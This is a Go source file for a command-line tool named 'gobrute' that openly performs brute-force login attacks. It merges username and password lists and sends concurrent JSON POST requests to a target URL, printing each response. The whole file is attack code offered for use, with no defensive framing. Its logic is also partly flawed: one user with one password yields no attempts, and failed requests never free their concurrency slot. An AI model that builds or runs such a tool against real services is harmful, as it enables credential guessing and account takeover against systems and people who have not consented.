package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"

	"github.com/spf13/cobra"
	"github.com/valyala/fasthttp"
)

var (
	target     string
	payload    string
	user       string
	pass       string
	maxThreads int
)

var rootCmd = &cobra.Command{
	Use:   "gobrute [target] [payload]",
	Short: "A command-line tool for performing brute-force attacks",
	Long:  "A command-line tool that performs brute-force attacks using a specified URL and payload",
	Run: func(cmd *cobra.Command, args []string) {
		// This function will be called when the root command is executed
		if len(args) < 2 {
			fmt.Println("Please provide a URL (target) and a payload")
			return
		}

		target = args[0]

		if !isValidURL(target) {
			fmt.Println("Please provide a valid URL (target)")
			return
		}

		payload = args[1]

		crack(target, payload, getUser(), getPass())
	},
}

func isValidURL(u string) bool {
	parsedURL, err := url.Parse(u)
	return err == nil && parsedURL.Scheme != "" && parsedURL.Host != ""
}

func isFile(f string) bool {
	_, err := os.Stat(f)
	return err == nil
}

func getFlagAsList(f string) []string {
	readFile, err := os.Open(f)

	if err != nil {
		fmt.Println(err)
	}
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	var fileLines []string

	for fileScanner.Scan() {
		fileLines = append(fileLines, fileScanner.Text())
	}

	readFile.Close()

	return fileLines
}

func getUser() []string {
	if isFile(user) {
		return getFlagAsList(user)
	} else {
		return []string{user}
	}
}

func getPass() []string {
	if isFile(pass) {
		return getFlagAsList(pass)
	} else {
		return []string{pass}
	}
}

func sendPostRequest(url string, jsonPayload []byte, wg *sync.WaitGroup, ch chan struct{}) {
	defer wg.Done()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.SetContentType("application/json")
	req.Header.SetMethod("POST")
	req.SetRequestURI(url)
	req.SetBody(jsonPayload)

	client := &fasthttp.Client{}
	err := client.Do(req, resp)
	if err != nil {
		fmt.Printf("Error sending POST request: %s\n", err)
		return
	}

	fmt.Println("Response:", string(resp.Body()))

	<-ch
}

func crack(target string, payload string, user []string, pass []string) {
	var combolist []string

	if len(user) > 1 && len(pass) > 1 {
		fmt.Println("Merging users list and passwords list")
		for _, u := range user {
			for _, p := range pass {
				combolist = append(combolist, strings.Join([]string{u, p}, ":"))
			}
		}
	}

	if len(user) > 1 && len(pass) == 1 {
		fmt.Println("Merging users list and password")
		for _, u := range user {
			combolist = append(combolist, strings.Join([]string{u, pass[0]}, ":"))
		}
	}

	if len(user) == 1 && len(pass) > 1 {
		fmt.Println("Merging user and passwords list")
		for _, p := range pass {
			combolist = append(combolist, strings.Join([]string{user[0], p}, ":"))
		}
	}

	var wg sync.WaitGroup
	ch := make(chan struct{}, maxThreads)

	for _, combo := range combolist {
		c := strings.Split(combo, ":")

		// Parse the JSON payload into a json.RawMessage
		var jsonPayload json.RawMessage
		if err := json.Unmarshal([]byte(payload), &jsonPayload); err != nil {
			fmt.Println("Error parsing JSON payload:", err)
			return
		}

		// Use Sprintf on the raw JSON data
		formattedPayload := fmt.Sprintf(string(jsonPayload), c[0], c[1])
		fmt.Println("Formatted payload:", formattedPayload)

		// jsonPayload := []byte(fmt.Sprintf(payload, c[0], c[1]))

		ch <- struct{}{}
		wg.Add(1)
		go sendPostRequest(target, []byte(formattedPayload), &wg, ch)
	}

	wg.Wait()
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func main() {
	// Add flags for users and passwords
	rootCmd.Flags().StringVar(&user, "user", "", "Single Username or Email or Path to the user file")
	rootCmd.Flags().StringVar(&pass, "pass", "", "Single password or Path to the password file")
	rootCmd.Flags().IntVar(&maxThreads, "threads", 10, "Maximum number of concurrent goroutines")

	Execute()
}
